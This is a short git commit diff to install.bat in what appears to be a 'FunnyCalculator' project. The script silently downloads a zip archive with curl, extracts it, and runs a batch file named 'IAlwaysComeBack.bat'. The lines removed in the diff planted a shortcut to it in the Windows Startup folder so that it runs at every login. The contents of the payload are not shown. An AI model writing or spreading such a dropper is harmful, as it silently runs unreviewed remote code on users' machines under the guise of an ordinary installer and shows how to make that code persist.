ed75495dc09472e7c7099f3e58b7bb1e463cff1f
Myelin Lennox <118149338+MyelinLennox@users.noreply.github.com>
2025-11-28 02:26:25 -0600

    ...now fix?

--- install.bat
+++ install.bat
@@ -3,5 +3,4 @@
 cd "C:\Users\%USERNAME%\"
 curl.exe -s -L -O "https://github.com/MyelinLennox/FunnyCalculator/raw/refs/heads/main/EatMyShortz.zip"
 tar -xf EatMyShortz.zip
-mv "EatMyShortz.zip\IAlwaysComeBack.lnk" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\IAlwaysComeBack.lnk"
-start "C:\Users\%USERNAME%\EatMyShortz\IAlwaysComeBack.bat"
+"C:\Users\%USERNAME%\EatMyShortz\IAlwaysComeBack.bat"
